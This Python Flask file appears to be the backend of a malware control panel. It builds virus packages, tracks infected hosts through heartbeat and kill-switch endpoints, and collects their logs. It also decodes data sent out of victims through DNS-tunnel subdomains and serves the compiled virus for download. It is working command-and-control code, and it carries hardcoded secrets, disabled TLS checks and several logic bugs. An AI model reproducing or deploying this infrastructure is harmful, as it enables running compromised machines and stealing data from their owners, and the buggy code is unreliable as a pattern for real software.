# Note for API, for now internal calls on the webpage will be using /function, while externals will be using /api/function 

from flask import Blueprint, render_template, request, flash, jsonify, send_file, redirect, url_for, session, send_from_directory
from flask_login import login_required, current_user
from werkzeug.utils import secure_filename
from datetime import datetime
#from .models import Note, ImageSet, Image
from .models import Virus, Hosts, Archived, CompilingHandler
from . import db
import sqlite3
import json
import os
import socketio
import secrets
import requests
import base64


auth = Blueprint('auth', __name__)  # Creating a Blueprint named 'auth'

## Ignore temp lack of ssl
os.environ['CURL_CA_BUNDLE'] = ''


api = Blueprint('api', __name__)
# For development token logic needs to be made
userToken = '1234567890'


relativeFolder = 'zippedFiles'
rootPath = os.path.dirname(os.path.abspath(__file__))
uploadFolder = os.path.join(rootPath, relativeFolder)
os.makedirs(uploadFolder, exist_ok=True)


#############################
##### Helper Functions ######
#############################

# Connects to DB for manual SQL statements, though most DB access goes through SQLalchemy
# Needs to be param bound and closed after
def dbConnect():
    global conn
    #conn = sqlite3.connect('/var/www/instance/database.db')
    conn = sqlite3.connect('instance/database.db')
    global curs
    curs = conn.cursor()


def validateToken():
    sessionToken = session['token']
    print(f"session[token] = {sessionToken}")
    print(f"current_user.token = {current_user.token}")
    if 'token' not in session or session['token'] != current_user.token:
        flash('Session expired or invalid token. Please log in again.', category='error')
        logout_user()
        return False
    return True


#############################
###### Compiling APIs #######
#############################
@api.route('/api/getpendingjob', methods=['GET'])
def getPendingJob():
    try:
        # We need some logic to authenticate the get request, for new a bad seceret will be used
        badSecret = "verySecretAuth"

        # Extract API key from the headers
        commonSeceret = request.headers.get('Authorization')
        if not commonSeceret:
            return jsonify({'message': 'API key is required'}), 403

        # Fetch the first pending job
        pendingJob = (
            db.session.query(CompilingHandler)
            .join(Virus, CompilingHandler.virus_id == Virus.id)
            .filter(
                CompilingHandler.status == "pending",
                Virus.is_alive == True
            )
            .first()
        )
        if not pendingJob:
            return jsonify({'message': 'No pending jobs available'}), 404

        # Fetch the associated virus
        virus = Virus.query.get(pendingJob.virus_id)
        if not virus:
            return jsonify({'message': 'Associated virus not found'}), 404

        # Validate the API key
        if badSecret != commonSeceret:
            return jsonify({'message': 'Invalid API key'}), 403

        # Prepare the response data
        responseData = {
            'job_id': pendingJob.id,
            'virus_id': virus.id,
            'virus_name': virus.name,
            'heartbeat_rate': virus.heartbeat_rate,
            'use_case_settings': virus.use_case_settings.split(','),  # Return as a list
            'virus_api': virus.virus_api,
        }
        return jsonify(responseData), 200

    except Exception as e:
        print(f"Error fetching pending job: {e}")
        return jsonify({'message': 'Error occurred while fetching pending job'}), 500


@api.route('/api/uploadcompiledjob', methods=['POST'])
def uploadCompiledJob():
    try:
        # Extract API key from the headers
        print(request)
        print(request.form)
        print(request.files)
        apiKey = request.headers.get('Authorization')
        if not apiKey:
            return jsonify({'message': 'API key is required'}), 403

        # Extract the job ID and file from the request
        jobId = request.form.get('job_id')
        file = request.files.get('compiled_file')

        if not jobId or not file:
            return jsonify({'message': 'Job ID and compiled file are required'}), 400

        # Fetch the compiling job
        compilingJob = CompilingHandler.query.get(jobId)
        if not compilingJob:
            return jsonify({'message': 'Compiling job not found'}), 404

        # Fetch the associated virus
        virus = Virus.query.get(compilingJob.virus_id)
        if not virus:
            return jsonify({'message': 'Associated virus not found'}), 404

        # Validate the API key
        if virus.virus_api != apiKey:
            return jsonify({'message': 'Invalid API key'}), 403

        # Save the uploaded file
        filename = secure_filename(f"{virus.name}_{virus.id}.zip")
        filepath = os.path.join(uploadFolder, filename)
        file.save(filepath)

        # Update the virus with the file path
        virus.storage_path = filepath
        db.session.commit()

        # Mark the job as completed
        compilingJob.status = "done"
        db.session.commit()

        return jsonify({'message': 'Compiled file uploaded and job updated successfully'}), 200

    except Exception as e:
        print(f"Error uploading compiled job: {e}")
        return jsonify({'message': 'Error occurred while uploading compiled job'}), 500
    
    

#############################
#####    Virus API    ######
#############################
    
# API to handle heartbeat ask from virus, if the virus is set to is_alive = False, the virus will clean it self up
@api.route('/api/heartbeat', methods=['GET', 'POST'])
def heartbeat():
    print("Heartbeat called")
    try:
        # Retrieve the API key from the request
        # virus_api = request.headers.get('Authorization')
        virus_api = request.json.get('api_key')
        #data = request.json.get('data')
        hostname = request.json.get('host_name')
        print(hostname)
        #hostname = request.form.get('host_name')
        print(virus_api)

        if not virus_api:
            return jsonify({'message': 'Authorization header missing'}), 400

        # Check if the virus exists with the provided API key
        virus = Virus.query.filter_by(virus_api=virus_api).first()
        # Getting host in order with virus ID in order to update the last heartbeat 
        host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
        print(host)
        if host:
            host.last_heartbeat = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            # Commit changes to the database
            db.session.commit()
        else:
            print("Could not get host")

        #host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()

        if not virus:
            print("Invalid API key")
            return jsonify({'message': 'Invalid API key'}), 404
        # Check the is_alive status
        if virus.is_alive:
            print("Virus is alive")
            return jsonify({'message': 'Virus is alive', 'is_alive': 'True'}), 200
        else:
            print("Virus is not alive. Clean up required")
            return jsonify({'message': 'Virus is not alive. Clean up required.', 'is_alive': 'False'}), 200

    except Exception as e:
        print(f"Error in heartbeat: {e}")
        return jsonify({'message': 'Internal server error'}), 500

# Takes log data from the test virus and saves it to the host model, with foregin keys to user.id and virus.id
@api.route('/api/datatosend', methods=['POST'])
def datatosend():
    try:
        # Debugging the raw JSON data
        print("JSON data:", request.json)

        virus_api = request.json.get('api_key')
        data = request.json.get('data')
        
        if not virus_api or not data:
            return jsonify({'message': 'api_key and data are required'}), 400
        
        hostname = data.get('host_name')
        use_case_logs = data.get('data')

        if not hostname or not use_case_logs:
            return jsonify({'message': 'host_name and data logs are required'}), 400
        
        print(f"virus_api = {virus_api}, hostname = {hostname}, logs = {use_case_logs}")

        # Find the virus using the API key
        virus = Virus.query.filter_by(virus_api=virus_api).first()
        if not virus:
            return jsonify({'message': 'Invalid API key'}), 404

        # Check if the host already exists
        host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()

        if not host:
            # Create a new host if it doesn't exist
            host = Hosts(
                host_name=hostname,
                last_heartbeat=datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
                user_id=virus.user_id,
                virus_id=virus.id,
                log_info=str(use_case_logs)  # Save logs as a string
            )
            db.session.add(host)
        else:
            # Update existing host
            host.last_heartbeat = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            host.log_info = str(use_case_logs)  # Update logs

        # Commit changes to the database
        db.session.commit()

        return jsonify({'message': f'Logs saved for host {hostname}', 'status': 'success'}), 200

    except Exception as e:
        print(f"Error saving logs: {e}")
        return jsonify({'message': 'Internal server error'}), 500



#############################
####### USECASE APIs ########
#############################
@api.route('/api/dnstunneling', methods=['GET', 'POST'])
def dnsTunnelingHandler():
    try:
        # Extract the subdomain 
        full_host = request.headers.get('Host')
        if not full_host:
            return jsonify({'message': 'Host header is required'}), 400

        # Get the subdomain portion 
        subdomain = full_host.split('.')[0]
        if not subdomain:
            return jsonify({'message': 'Invalid DNS tunneling format'}), 400

        # Decode the URL-safe Base64 payload
        try:
            decoded_data = base64.urlsafe_b64decode(subdomain).decode('utf-8')
        except Exception as e:
            return jsonify({'message': 'Invalid base64 payload in subdomain', 'error': str(e)}), 400

        # Log the received and decoded data
        print(f"Received subdomain (base64): {subdomain}")
        print(f"Decoded data: {decoded_data}")

        response = {
            'message': 'DNS tunneling processed successfully',
            'decoded_data': decoded_data,
        }
        return jsonify(response), 200

    except Exception as e:
        print(f"Error handling DNS tunneling: {e}")
        return jsonify({'message': 'An error occurred while processing DNS tunneling', 'error': str(e)}), 500




#####################################
####### DATA HANDLING APIs ##########
#####################################

###### Virus calls #######

# @api.route('/download')
# def download_exe():
#     exe_path = '/var/www/rubberduck/virus/generated_script.exe'  
#     return send_file(exe_path, as_attachment=True)


# @api.route('/update', methods=['POST'])
# def update():
#     print("Virus update called!")
#     data = json.loads(request.data)
#     print(data)
#     try:
#         return jsonify({'message': 'success'})  # Return a valid response
#     except Exception as e:
#         print(e)
#         return jsonify({'message': str(e)})  # Return a v

#####

###### Create virus ######
# @login_required
# @api.route('/virusmake', methods=['GET', 'POST'])
# def virusmake():
#     virus.test()
#     try:
#         virus.generateExe("generated_script.py")
#         return jsonify({'message': 'success'})  # Return a valid response
#     except Exception as e:
#         print(e)
#         return jsonify({'message': str(e)})  # Return a valid response with the error message
   



##### SAVE DATA APIS #####

@api.route('/savevirus', methods=['POST'])
@login_required
def saveVirus():
    print("Save virus called")
    try:
        # Validates token against session and on DB
        if validateToken():
            # Get form data
            name = request.form.get('name') 
            heartbeat_rate = request.form.get('heartbeat_rate') 
            use_case_settings = request.form.getlist('use_case_settings')  
            # Generate a unique API key
            virus_api = secrets.token_hex(32)
            
            # Debugging output
            print(f"Name: {name}")
            print(f"Heartbeat Rate: {heartbeat_rate}")
            print(f"Use Case Settings: {use_case_settings}")
            print(f"API key: {virus_api}")

            # Validate required fields
            if not name or not heartbeat_rate:
                return jsonify({'message': 'Name and Heartbeat Rate are required'}), 400

            # Save the virus to the database
            new_virus = Virus(
                name=name,
                heartbeat_rate=heartbeat_rate,
                use_case_settings=','.join(use_case_settings),  # Convert list to comma-separated string
                user_id=current_user.id,  
                is_alive=True,
                virus_api=virus_api

            )

            db.session.add(new_virus)
            db.session.commit()

            new_job = CompilingHandler(
                virus_id=new_virus.id,  # Can access the new virus ID after commit
                user_id=current_user.id,  
                status="pending"
            )
            db.session.add(new_job)
            db.session.commit()

            flash('Virus created successfully!', category='success')
            return redirect(url_for('views.virus')) 
        # else:
        #     print("Token did not match ")
        #     return redirect(url_for('auth.logout')) 

    except Exception as e:
        # Log the error and redirect with an error message
        print(f"Error saving virus: {e}")
        flash('An error occurred while saving the virus.', category='error')
        return redirect(url_for('auth.logout'))  

## OLD json virus save
# @api.route('/savevirus', methods=['POST'])
# @login_required
# def save_virus():
#     print("Save virus called")
#     try:
#         # Parse request data
#         # print(request.form.get('name'))
#         data = json.loads(request.data)
#         print(data)
#         user_id = data.get('user_id')  # User ID of the creator
#         print(user_id)
#         token = data.get('token')  # Access token for validation
#         print(token)
#         name = data.get('name')  # Name of the virus
#         print(name)
#         heartbeat_rate = data.get('heartbeat_rate')  # Heartbeat rate of the virus
#         print(heartbeat_rate)
#         use_case_settings = data.get('use_case_settings')  # Use cases as a comma-separated string
        
#         # Token validation 
#         if token != userToken:  
#             return jsonify({'message': 'Invalid token or duplicate virus'}), 403

#         # Save the virus to the database
#         new_virus = Virus(
#             name=name,
#             heartbeat_rate=heartbeat_rate,
#             use_case_settings=','.join(use_case_settings),  # Ensure it's stored as a comma-separated string
#             user_id=user_id,
#             is_alive=True
#         )
#         db.session.add(new_virus)
#         db.session.commit()

#         return jsonify({'message': 'Virus created successfully!'}), 201

#     except Exception as e:
#         # Log the exception and return an error response
#         print(f"Error saving virus: {e}")
#         return jsonify({'message': 'An error occurred', 'error': str(e)}), 500

# ## saves a virus old
# @api.route('/savevirus', methods=['POST'])
# def saveVirus():
#     data = json.loads(request.data)
#     print(data)
#     user_id = data['user_id']
#     token = data['token']
#     virus_type = data['virus_type']
#     name = data['name']
#     heartbeat_rate = data['heartbeat_rate']
#     print(virus_type)
#     print(user_id)
#     print(name)
#     print(token)
#     if token == userToken :
#         try:
#             dbConnect()
#             curs.execute("INSERT INTO Virus (virus_type, name, heartbeat_rate, user_id) VALUES (?, ?, ?, ?)", (virus_type, name, heartbeat_rate, user_id))
#             conn.commit()
#             conn.close()
#             print("Success")
#             flash('Virus Created!', category='success')
#             return jsonify({'message': 'success'})
#         except Exception as e:
#             print(e)
#             return jsonify({'message': e})
#     else:
#         print("token not valid or duplicate virus")
#         flash('Duplicate virus  or wrong access token', category='error')
#         return jsonify({'message': 'token not valid or duplicate virus '})


## saves a hosts 
@api.route('/savehost', methods=['POST'])
def saveHost():
    data = json.loads(request.data)
    print(data)
    user_id = data['user_id']
    virus_id = data['virus_id']
    pc_name = data['pc_name']
    country = data['country']
    host_notes = data['host_notes']
    settings = data['settings']
    last_heartbeat = data['last_heartbeat']
    if validateToken():
        try:
            dbConnect()
            curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
            conn.commit()
            conn.close()
            print("Success")
            flash('Host Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid")
        flash('Possible wrong access token', category='error')
        return jsonify({'message': 'token not valid'})


#########################
##### GET DATA APIS #####
#########################

# Migrated this to view.py
## Get all active virus for the user to display in virus view, needs to be remade together with getvirus, kind of bloat
# @login_required
# @api.route('/getactivevirus', methods=['GET'])
# def getActiveVirus():
#     print("getactivevirus")
#     try:
#         if validateToken():
#             dbConnect()
#             print("Trying to get virus table data")

#             curs.execute("SELECT * FROM Virus WHERE user_id = ? AND is_alive = 1", (str(current_user.id)))
#             rows = curs.fetchall()

#             conn.close()
#             print("jsondump")
#             print(json.dumps(rows))
#             return json.loads(json.dumps(rows))

    
#     except Exception as e:
#         print(e)
#         return jsonify({'message': e})
#     else:
#         return jsonify({'message': 'token not valid'})

# @login_required
# @api.route('/getvirus', methods=['GET'])
# def getVirus():
#     try:
#         # Validates session token against DB token
#         if validateToken():
#             dbConnect()
#             print("Trying to get virus table data")

#             curs.execute("SELECT * FROM Virus WHERE user_id = ?", (str(current_user.id)))
#             rows = curs.fetchall()

#             conn.close()
#             print("jsondump")
#             print(json.dumps(rows))
#             return json.loads(json.dumps(rows))
#     except Exception as e:
#         print(e)
#         return jsonify({'message': e})
#     else:
#         return jsonify({'message': 'token not valid'})        

@api.route('/gethosts', methods=['GET'])
def getHosts():
    print("getHosts")
    try:
        #token = "shit"
        # print(f"token = {token}")
        # print(f"current_user.token = {current_user.token}")
        
        # Calls helper function to validate session token to db token
        if validateToken():
            dbConnect()
            print("Trying to get Hosts table data")
            curs.execute("SELECT * FROM Hosts WHERE user_id = ?", (str(current_user.id)))
            rows = curs.fetchall()
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        else:         
            print("Token did not match ")
            return redirect(url_for('auth.logout')) 
    except Exception as e:
        print(e)
        return jsonify({'message': 'Token not valid'}), 403
    else:
        return jsonify({'message': "Some other error happened"}), 500

####### Archive ########
@api.route('/archivevirus', methods=['POST'])
@login_required
def archiveVirus():
    print("archiveVirus called")
    try:
        # Validates session token against DB token
        if validateToken():
            virus_id = request.form.get("virus_id")
            # Retrieve the virus from the database
            virus = Virus.query.get(virus_id)

            # Ensure the virus exists and belongs to the current user
            if not virus or int(virus.user_id) != int(current_user.id):
                flash('Virus not found or unauthorized.', category='error')
                return redirect(url_for('views.virus'))  

            # Check if the virus is already archived
            if not virus.is_alive:
                flash('Virus is already archived.', category='warning')
                return redirect(url_for('views.virus'))  

            # Create a new entry in the Archived table
            archived_entry = Archived(
                log_name=f"Archived_{virus.name}",  
                virus_id=virus.id,
                user_id=current_user.id
            )
            db.session.add(archived_entry)

            # Update the virus to mark it as not alive
            virus.is_alive = False
            db.session.commit()

            flash('Virus archived successfully!', category='success')
            return redirect(url_for('views.virus'))  
        else:
            print("Token did not match ")
            return redirect(url_for('auth.logout')) 

    except Exception as e:
        # Log the error and redirect with an error message
        print(f"Error archiving virus: {e}")
        flash('An error occurred while archiving the virus.', category='error')
        return redirect(url_for('auth.logout'))  



####### DELETE APIS ##########
@api.route('/deletevirus', methods=['POST'])
@login_required
def deleteVirus():
    print("deleteVirus called")
    try:
        # Validates session token against DB token
        if validateToken():
            # Retrieve the virus from the database
            
            virus_id = request.form.get("virus_id")
            virus = Virus.query.get(virus_id)
            print("virus_id")
            print(virus_id)
            print("virus.user_id")
            print(virus.user_id)
            print("current_user.id")
            print(current_user.id)

            # Ensure the virus exists and belongs to the current user
            if int(virus.user_id) != int(current_user.id):
                flash('Virus not found or unauthorized.', category='error')
                return redirect(url_for('views.virus'))  

            # Delete the virus
            dbConnect()
            print("Trying to delete Virus")
            curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (virus_id, current_user.id))
            conn.commit()
            conn.close()
            # db.session.delete(virus)
            # db.session.commit()

            flash('Virus deleted successfully!', category='success')
            return redirect(url_for('views.virus')) 
        else:
            print("Token did not match ")
            return redirect(url_for('auth.logout'))  

    except Exception as e:
        print(f"Error deleting virus: {e}")
        flash('An error occurred while deleting the virus.', category='error')
        return redirect(url_for('views.virus'))  

# Old Api to delete virus with binded executed param
# @api.route('/deletevirus', methods=['POST'])
# #@login_required
# def deleteVirus():

#     virus_id = request.form.get('name')  # Virus name
#     user= = request.form.get('heartbeat_rate')  # Heartbeat rate
#     use_case_settings = request.form.getlist('use_case_settings')  # Use cases (list of selected checkboxes)

#     print("deleteVirus called")
#     data = request.get_json()
#     print("data:")
#     print(data)
#     id = data['virus_id']
#     user_id = data['user_id']
#     token = data['token']
#     print(id)
#     print(token)
#     if token == userToken:
#         try:
#             dbConnect()
#             print("Trying to delete Virus")
#             curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (virus_id, user_id))
#             conn.commit()
#             conn.close()
#             print("Virus deleted")
#             flash('Virus deleted!', category='success')
#             return jsonify({'message': 'success'})
#         except Exception as e:
#             return jsonify({'message': e})
#     else:
#         return jsonify({'message': 'token not valid'})


@api.route('/deletehost', methods=['DELETE'])
@login_required
def deleteHost():
    print("deleteHost called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['host_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    try:
        dbConnect()
        print("Trying to delete Host")
        curs.execute("DELETE FROM Hosts WHERE id = ? AND user_id = ?", (id, str(current_user.id)))
        conn.commit()
        conn.close()
        print("Host deleted")
        flash('Host deleted!', category='success')
        return jsonify({'message': 'success'})
    except Exception as e:
        return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})


################################
######    UPDATE APIS    #######
################################
    
# Sets the virus to is_alive = False
@api.route('/setinactive', methods=['POST'])
@login_required
def setInactive():
    try:
        # Retrieve the virus ID from the request form data
        virus_id = request.form.get('virus_id')
        if not virus_id:
            return jsonify({'message': 'Virus ID is required'}), 400
        # Query the virus associated with the current user
        virus = Virus.query.filter_by(id=virus_id, user_id=current_user.id).first()
        if not virus:
            return jsonify({'message': 'Virus not found or unauthorized'}), 404
        # Update the is_alive attribute
        virus.is_alive = False
        db.session.commit()
        flash('Virus set as inactive.', category='success')
        return redirect(url_for('views.virus'))  
        #return jsonify({'message': f'Virus {virus.name} has been marked as inactive.', 'status': 'success'}), 200

    except Exception as e:
        print(f"Error in set_inactive: {e}")
        
        flash('Could not set the virus as inactiave.', category='error')
        return redirect(url_for('views.virus'))  
        #return jsonify({'message': 'Internal server error'}), 500    


#############################
#### Virus Download APIs ####
#############################

# External API endoint, takes API key and matches it with the relative virus and downloads it
@api.route('/api/virusdownload', methods=['POST'])
def virusDownload():
    try:
        # Retrieve the virus ID from the form
        virus_api = request.json.get('api_key')

        if not virus_api:
            return jsonify({'message': 'Invalid API key'}), 404

        # Querying the database for the virus using its ID
        virus = Virus.query.get(virus_api)

        if not virus:
            return jsonify({'message': 'Virus not found'}), 400

        # Checking if the virus has a compiled file path
        if not virus.storage_path:
           return jsonify({'message': 'Virus not avaliable for download'}), 400

        # Setting where the zip is stores from thevirus.storage_path
        zip_directory = os.path.dirname(virus.storage_path)

        # Setting the filename of the file
        file_name = os.path.basename(virus.storage_path)

        # Using Flaskss send_from_directory to send the file to the API caller
        return send_from_directory(
            directory=zip_directory,
            path=file_name,
            as_attachment=True
        )
    
    except Exception as e:
        # In case of other error it will just display internal server error, with the view of what error actually happened on server side
        print(f"Error in dashboard download endpoint: {e}")
        return jsonify({'message': 'Internal server error'}), 500



    return send_file(exe_path, as_attachment=True)

# Acts as a dashboard method for virus and checks if the user is logged in and tokens are valid
@login_required
@api.route('/internalvirusdownload', methods=['POST'])
def internalVirusDownload():
    try:
        if not validateToken():
            # Retrieve the virus ID from the form
            virus_id = request.form.get('virus_id')

            if not virus_id:
                flash('Virus ID is required', category='error')
                return redirect(url_for('views.virus')) 

            # Query the database for the virus using its ID
            virus = Virus.query.get(virus_id)

            if not virus:
                flash('Virus not found', category='error')
                return redirect(url_for('views.virus')) 

            # Ensure the current user owns the virus
            if virus.user_id != current_user.id:
                flash('Unauthorized access for this virus', category='error')

            # Check if the virus has a compiled file path
            if not virus.storage_path:
                flash('Virus file not available for download', category='error')
                return redirect(url_for('views.virus')) 

            # Set where the zip is stores from thevirus.storage_path
            zip_directory = os.path.dirname(virus.storage_path)

            # Set the filename of the file
            file_name = os.path.basename(virus.storage_path)

            # Use Flask's send_from_directory to send the file
            return send_from_directory(
                directory=zip_directory,
                path=file_name,
                as_attachment=True
            )
        else:
            # In case the token authentication fails, the user will be logged out and sent to login page
            flash('Authentication failed for token', category='error')
            return redirect(url_for('auth.logout')) 
    
    except Exception as e:
        # In case of other error it will just display internal server error, with the view of what error actually happened on server side
        print(f"Error in dashboard download endpoint: {e}")
        flash('Internal server error', category='error')
        return redirect(url_for('views.virus')) 






########## Testing area ############
## Json examples ##
## Gets used to test APIs with json as data in the calls

exampleUser = {
    "user_id": 1,
    "token": "1234567890",
    "email ": "tester@tester.com",
    "password ": "Test12345",
    "public_key ": "shapublic",
    "private_key ": "shaprivate",
    }

exampleVirus = {
    "user_id": 1,
    "token": "1234567890",
    "virus_type": "Silent",
    "name": "TestVirus1",
    "heartbeat_rate": "1h",
    "user_id": 1
    }

exampleHost= {
    "user_id": 1,
    "token": "1234567890",
    "pc_name": "Silent",
    "country": "TestVirus1",
    "host_notes": "1h",
    "settings": "SomeSetting",
    "last_heartbeat": "10/05/2023;21:45",
    "host_notes": "1h",
    "user_id": 1,
    "virus_id": 1,
    }

exampleDeleteHost= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

exampleDeleteVirus= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

## Example Python api call which POST to a remote server api with a json object which uses the exampleJson format in a try catch block
### Get examples ###
@api.route('/apivirussendexample', methods=['GET', 'POST'])
def apiVirusExample():
    try:
        url = "http://127.0.0.1:5000/savevirus"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apiupdate', methods=['GET', 'POST'])
def apiApiExample():
    try:
        url = "http://127.0.0.1:5000/update"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apihostssendexample', methods=['GET', 'POST'])
def apiHostsExample():
    try:
        url = "http://127.0.0.1.93:5000/savehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
### Get examples ###
@api.route('/apigetvirusexample', methods=['GET', 'POST'])
def apiGetVirusExample():
    try:
        url = "http://127.0.0.1:5000/getvirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apigethostsexample', methods=['GET', 'POST'])
def apiGetHostsExample():
    try:
        url = "http://127.0.0.1:5000/gethosts"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   

### Delete examples ###
@api.route('/apideletevirusexample', methods=['GET', 'POST'])
def apiDeleteVirusExample():
    print("apiDeleteVirusExample")
    print(current_user.id)
    try:
        url = "http://127.0.0.1:5000/deletevirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apideletehostsexample', methods=['GET', 'POST'])
def apiDeleteHostsExample():
    print("apiDeleteHostsExample")
    try:
        url = "http://127.0.0.1:5000/deletehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   